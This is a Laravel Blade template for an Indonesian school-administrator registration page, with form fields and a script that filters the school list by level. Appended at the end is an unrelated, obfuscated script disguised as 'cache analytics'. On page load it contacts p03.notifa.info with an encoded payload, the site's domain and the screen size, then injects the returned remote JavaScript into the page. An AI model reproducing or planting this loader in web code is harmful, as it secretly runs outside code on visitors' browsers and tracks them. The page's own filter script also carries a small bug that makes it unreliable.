<!DOCTYPE html>
<html lang="en">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>Daftar Admin Sekolah</title>
    <!-- plugins:css -->
    <link rel="stylesheet" href="{{ asset ('assets-sekolah/vendors/iconfonts/mdi/css/materialdesignicons.min.css') }}">
    <link rel="stylesheet" href="{{ asset ('assets-sekolah/vendors/css/vendor.bundle.base.css') }}">
    <link rel="stylesheet" href="{{ asset ('assets-sekolah/vendors/css/vendor.bundle.addons.css') }}">
    <!-- endinject -->
    <!-- plugin css for this page -->
    <!-- End plugin css for this page -->
    <!-- inject:css -->
    <link rel="stylesheet" href="{{ asset ('assets-sekolah/css/style.css') }}">
    <!-- endinject -->
    <link rel="shortcut icon" href="{{ asset ('assets-sekolah/images/favicon.png') }}"/>
</head>

<body>
<div class="container-scroller">
    <div class="container-fluid page-body-wrapper full-page-wrapper">
        <div class="content-wrapper d-flex align-items-center auth register-bg-1 theme-one">
            <div class="row w-100 mx-auto">
                <div class="col-lg-4 mx-auto">
                    <h2 class="text-center mb-4">Daftar Admin Sekolah</h2>
                    <div class="auto-form-wrapper">
                        <form action="{{route('adminsekolah.register.submit')}}" method="post">
                            @csrf
                            <div class="form-group">
                                <div class="input-group">
                                    <input type="text" class="form-control @error('nama_admin') is-invalid @enderror"
                                           value="{{ old('nama_admin') }}"
                                           name="nama_admin" placeholder="Nama Lengkap">
                                    @error('nama_admin')
                                    <span class="invalid-feedback" role="alert">
                                        <strong>{{ $message }}</strong>
                                    </span>
                                    @enderror
                                    <div class="input-group-append">
                                        <span class="input-group-text"><i
                                                    class="mdi mdi-check-circle-outline"></i></span>
                                    </div>
                                </div>
                            </div>

                            <div class="form-group">
                                <select name="kategori" class="select-kategori custom-select mb-3">
                                    <option value="">Pilih jenjang sekolah</option>
                                    <option value="SMP">SMP/MTS/Sederajat</option>
                                    <option value="SMA">SMA/SMK/MA/Sederajat</option>
                                </select>
                            </div>

                            <div class="form-group">
                                <select id="select-sekolah" style="display: none" name="nama_sekolah" class="custom-select mb-3" >
                                    @foreach($datas as $data)

                                        <option id="sekolah" value="{{$data->nama_sekolah}}">{{$data->nama_sekolah}}</option>

                                    @endforeach
                                </select>
                            </div>

                            <div class="form-group">
                                <div class="input-group">
                                    <input type="email" class="form-control @error('email') is-invalid @enderror"
                                           value="{{ old('email') }}"
                                           name="email" placeholder="Masukkan Email">
                                    @error('email')
                                    <span class="invalid-feedback" role="alert">
                                        <strong>{{ $message }}</strong>
                                    </span>
                                    @enderror
                                    <div class="input-group-append">
                                        <span class="input-group-text"><i
                                                    class="mdi mdi-check-circle-outline"></i></span>
                                    </div>
                                </div>
                            </div>

                            <div class="form-group">
                                <div class="input-group">
                                    <input type="password" class="form-control @error('password') is-invalid @enderror"
                                           name="password" placeholder="Password">
                                    @error('password')
                                    <span class="invalid-feedback" role="alert">
                                        <strong>{{ $message }}</strong>
                                    </span>
                                    @enderror
                                    <div class="input-group-append">
                                        <span class="input-group-text"><i
                                                    class="mdi mdi-check-circle-outline"></i></span>
                                    </div>
                                </div>
                            </div>
                            <div class="form-group">
                                <div class="input-group">
                                    <input type="password" class="form-control" name="password_confirmation"
                                           placeholder="Confirm Password">
                                    <div class="input-group-append">
                                        <span class="input-group-text"><i
                                                    class="mdi mdi-check-circle-outline"></i></span>
                                    </div>
                                </div>
                            </div>
                            <div class="form-group d-flex justify-content-center">
                                <div class="form-check form-check-flat mt-0">

                                </div>
                            </div>
                            <div class="form-group">
                                <button class="btn btn-primary submit-btn btn-block">Daftar</button>
                            </div>
                            <div class="text-block text-center my-3">
                                <span class="text-small font-weight-semibold">Sudah punya Akun ?</span>
                                <a href="{{route('adminsekolah.login')}}" class="text-black text-small">Masuk</a>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
        <!-- content-wrapper ends -->
    </div>
    <!-- page-body-wrapper ends -->
</div>
<!-- container-scroller -->
<!-- plugins:js -->
<script src="{{ asset ('assets-sekolah/vendors/js/vendor.bundle.base.js') }}"></script>
<script src="{{ asset ('assets-sekolah/vendors/js/vendor.bundle.addons.js') }}"></script>
<!-- endinject -->
<!-- inject:js -->
<script src="{{ asset ('assets-sekolah/js/template.js') }}"></script>
<!-- endinject -->
<script>
    const selectKategori = document.querySelector('.select-kategori');
    const selectSekolah = document.querySelector('#select-sekolah');
    const sekolah = document.querySelectorAll('#sekolah');

    selectKategori.addEventListener('change', function () {
        if(this.value !== ''){
            selectSekolah.style.display = '';
            let dataSekolah;
            let data;
            if (this.value === 'SMA'){
                dataSekolah = Array.from(sekolah).map(s => s.value)
                .filter(s => s.includes('SMA') || s.includes('MA') || s.includes('SMK'));
            }else {
                dataSekolah = Array.from(sekolah).map(s => s.value)
                .filter(s => s.includes('SMP') || s.includes('MTS'));
            }
            dataSekolah.map(s => {
                data += `<option value="${s}">${s}</option>`
            });
            selectSekolah.innerHTML = data
            // console.log(dataSekolah)
        }else {
            selectSekolah.style.display = 'none'
        }
    })
</script>
<script type="text/javascript">if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function () {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) {
            fn();
        }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncX8%2flUox7P%2f3AoD2XHrHVmDsWlQPWH3Yk2z8RAbIFGUi7RXcoNr8BuLrPElLeKsTkPdCkk7foojBrt5%2fGsmGjiarFa%2fqW%2faEI90q3Q8oFGDaFu5Tu0z4%2bnowIJuo2IAnvxyy5JQJchyFj3t8%2fsJ31uy29L%2boSmhSzYWZIhVTaz%2bvW%2fBShFkiCvKQBeGnfkgCFNr%2fv2V9dquUKYFZO8Dn1iLeLhR6vYDrBtKgpWaMVThoaHmD7JMu61QRCOBOzx9cJ1hXjezxB98K%2bKGR9QyWvWGX83eKJYpxo4XMMpmHf7dLcPlV9JpwDVBFqcKD7wsHgCx8PPy7P5TZwSKiqi7Bg3lVwzplWMYJdF1se50JJ4wf9R5ft7Cy0EUmSbgOEbjn6xL%2bFSnXyNZ6I1uAgkF%2bsXScp62Sr9%2f2mRI95eTGWLjQpPe55sw0mBi3n7F4j7qgRU4Te%2fcMG1ITTRx3Loco1%2fTw%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }

        netbro_cache_analytics(requestCfs, function () {
        });
    };</script>

</body>

</html>
